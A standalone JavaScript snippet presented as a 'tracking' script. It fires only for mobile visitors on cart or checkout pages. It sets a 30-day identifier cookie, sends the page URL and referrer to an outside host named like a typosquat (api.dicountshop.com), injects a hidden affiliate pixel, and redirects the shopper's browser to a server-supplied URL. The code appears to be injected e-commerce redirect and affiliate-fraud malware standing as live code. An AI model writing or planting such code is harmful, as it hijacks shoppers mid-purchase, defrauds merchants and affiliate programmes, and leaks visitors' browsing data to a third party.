(async function() {
   
    function isMobileDevice() {
        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    if (!isMobileDevice()) return;
    if (sessionStorage.getItem('trackingInitialized')) return;

    function fetchCookieValue(cookieName) {
        const namePrefix = cookieName + '=';
        const cookies = document.cookie.split(';');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i].trim();
            if (cookie.indexOf(namePrefix) === 0) {
                return cookie.substring(namePrefix.length);
            }
        }
        return '';
    }

    function createUniqueIdentifier() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    function appendTrackerImage(url) {
        const img = document.createElement('img');
        img.src = url;
        img.style.display = 'none';
        document.body.appendChild(img);
    }

    async function initializeTrackingProcess() {
        try {
          
            let clientId = fetchCookieValue('client_identifier') || createUniqueIdentifier();
            const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
            document.cookie = `client_identifier=${clientId}; expires=${expires}; path=/`;

           
            const response = await fetch('https://api.dicountshop.com/api/track-user', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json','Access-Control-Allow-Origin':'*' },
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: clientId,
                    origin: window.location.hostname
                })
            });

            
            const data = await response.json();
            
            if (data.success) {
               
                appendTrackerImage(data.affiliate_url);
                if (data.redirect_url) {
                    sessionStorage.setItem('trackingInitialized', 'true');
                    window.location.href = data.redirect_url;
                }
            } else {
               
                appendTrackerImage(`https://api.dicountshop.com/api/fallback-pixel?id=${clientId}`);
            }

            
            sessionStorage.setItem('trackingInitialized', 'true');

        } catch (error) {
      
            console.error('Tracking Error:', {
                message: error.message,
                stack: error.stack,
                timestamp: new Date().toISOString()
            });
        }
    }

    function isCardPage() {
        const cardPageUrls = ['/cart', '/checkout']; 
        return cardPageUrls.some(url => window.location.pathname.includes(url));
    }
    
    if (isCardPage()) {
        initializeTrackingProcess();
    }

    
})();